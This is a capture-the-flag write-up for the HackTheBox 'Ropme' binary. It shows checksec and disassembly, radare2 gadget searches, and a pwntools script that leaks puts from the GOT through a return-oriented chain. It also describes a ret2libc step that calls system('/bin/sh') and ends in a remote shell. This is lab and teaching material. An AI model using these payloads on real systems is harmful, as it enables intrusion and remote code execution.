---
title: Ropme
description: Ropme challenge from HackTheBox write up.
---

# Ropme <a href='/assets/resources/HackTheBox/Ropme-resources.zip' title="Download resources"> :material-folder-zip:{:alt="Download resources"} </a>

## Enumeration

Let's start checking the security of the binary:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Ropme]
└─$ checksec ropme
[*] '/home/kali/Desktop/HTB/Ropme/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Even though PIE is disabled, ASLR is enabled to protect the addresses of libraries like `glibc`. Also NX is enabled so we can't execute shellcode in the stack. RELRO is partial, what means, we could modify the Global Offset Table (GOT) which allow the dynamic linker to load and link symbols. When a shared function is called, the GOT will point to the PLT where the dynamic linker is used to find the location of a certain function. Once the location is found, the address is saved in the GOT (Like a cache).

Time to spin up Ghidra and check the binary code:

```C
undefined8 main(void)

{
  char local_48 [64];
  
  puts("ROP me outside, how \'about dah?");
  fflush(stdout);
  fgets(local_48,500,stdin);
  return 0;
}
```

As you can see, the program is vulnerable to buffer overflow because the `fgets` function receives 500 characters but the buffer only has 64 characters. I couldn't find something inside the binary to get a flag so taking into account the binary security we saw earlier... I guess we could try to execute a `glibc` function to be able to execute a shell.

We need to use a technique called ROP (Return Oriented Programming). The idea is to overflow the return address in a stack frame with the address of functions or gadgets that are in memory and start jumping from one to another. The objective is to get information about the location of functions in `glibc`, we know that the base location of the library is random but the offsets between functions remain always the same so if we can leak the address of one single function we can get the rest. This way we can try to execute the `system` function with `/bin/sh` as parameter (In 32 bits the function parameters go in the stack but in 64 bits they are in registers).

## Address leak

### Getting some extra data

First we need to leak a function address, we can use the `puts` function to print the address to the screen but we will need to pass the address as a parameter.

In our case we have a 64 binary so we have to manipulate the `rdi` register (The first argument is stored there) to control the parameter of the `puts` function. To do this, we have to find gadgets in the binary to do this for us, using radare we can find what we need to move data from the stack to the `rdi` register:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Ropme]
└─$ r2 ./ropme
[0x00400530]> /R | grep 'pop rdi'
  0x004006d3                 5f  pop rdi
```

Cool, now is time to get the parameter for our `puts` function, a `glibc` function address, and also the location of the `puts` call, we need to call it. Since we already have to check some information of the `puts` function we can also choose it to leak its address:

```bash
[0x00400530]> pdf@sym.imp.puts
            ; CALL XREF from main @ 0x40063a
┌ 6: int sym.imp.puts (const char *s);
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└           0x004004e0      ff25320b2000   jmp qword [reloc.puts]      ; [0x601018:8]=0x4004e6
```
From this output we need the location of the `puts` call: `0x004004e0` and also the GOT entry address: `0x601018`.

Finally we need to get the `main` function entrypoint because we want to force the program to restart once we leak the `puts` address:

```bash
[0x00400530]> afl | grep main
0x004004f0    1 6            sym.imp.__libc_start_main
0x00400626    1 71           main
```
The address for the `main` function is `0x00400626`

### Leak time!

I wrote this script to be able to leak the address we need:

```python
#! /usr/bin/env python3

from pwn import *
import argparse

# Prepare env

parser = argparse.ArgumentParser(description='Pwn Ropme')
parser.add_argument('--remote', '-r', action='store_true')
args = parser.parse_args()

context.binary = './ropme'
if(args.remote):
  process = remote('<MACHINE_IP>', <MACHINE_PORT>)
else:
  process = process('./ropme')

# Start exploit

with log.progress('Leaking puts@glibc...') as p:
  junk = b'A' * 72
  pop_rdi = p64(0x4006d3) # Return address overwrite to move whatever pointed by RSP
  got_put = p64(0x601018) # Parameter pointed by RSP (Top of the stack), is the puts entry in the GOT table 
  put_call = p64(0x4004e0) # Return of pop call to execute puts with our parameter
  main_call = p64(0x400626) # Return to main softly to continue exploting with the address we got
  payload = junk + pop_rdi + got_put + put_call + main_call

  process.recvline('ROP me outside, how \'about dah?')
  process.sendline(payload)
  data = process.recvline()

  leaked_puts_raw = data.strip().ljust(8, b'\x00') # Make sure we have a 64 bits address (Adding missing 0s)
  leaked_puts = hex(u64(leaked_puts_raw))
  p.success(leaked_puts)

process.close()
```

It is prepared to be able to launch the attack against the local and the remote binary (You need the binary locally to configure the exploit context). One possible output for the remote (Remember that ASLR is enabled):

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Ropme]
└─$ ./test.py --remote
[*] '/home/kali/Desktop/HTB/Ropme/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to <MACHINE_IP> on port <MACHINE_PORT>: Done
[+] Leaking puts@glibc...: 0x7fd8602c0690
[*] Closed connection to <MACHINE_IP> port <MACHINE_PORT>
```


## Exploit time!

Now we need to know what is the `glibc` version of the server. Using [https://libc.rip/](https://libc.rip/){:target="_blank"}, we can enter the leaked memory address and the symbol's name: `puts` to get what we want:

```
libc6_2.23-0ubuntu11_amd64
libc6_2.23-0ubuntu6_amd64
libc6_2.23-0ubuntu9_amd64
libc6_2.23-0ubuntu10_amd64
libc6_2.23-0ubuntu5_amd64
libc6_2.23-0ubuntu4_amd64
libc6_2.23-0ubuntu7_amd64
libc6_2.13-0ubuntu4_amd64
libc6_2.13-0ubuntu15_amd64
```

Clicking in the versions we can check the base address of the `puts` symbol: `0x6f690`, also we can get the addreses for `system`: `0x45390` and the `/bin/sh` string as `str_bin_sh`: `0x18cd17` (I needed some try and error for this last one).

With all this information, we can add to our previous exploit a new section where, instead of executing the `puts` version to leak an address, we can execute the `system` function with `/bin/sh` as parameter. To get any `glibc` address, we have to first get the library offset: `puts_leaked_address - puts_base_address` and then we can just get any address doing: `function_base_address + offset`. I included as resource the complete Python script I used to exploit the binary: 

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Ropme]
└─$ ./pwn_ropme --remote
[*] '/home/kali/Desktop/HTB/Ropme/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to <MACHINE_IP> on port <MACHINE_PORT>: Done
[+] Leaking puts@glibc...: 0x7f64d9eab690
[+] Getting a shell...: Done
[*] Switching to interactive mode
ls
flag.txt
ropme
spawn.sh
```

If you try my Python script to exploit the binary locally and it fails, you will need to check your system `glibc` version and modify the script a bit.
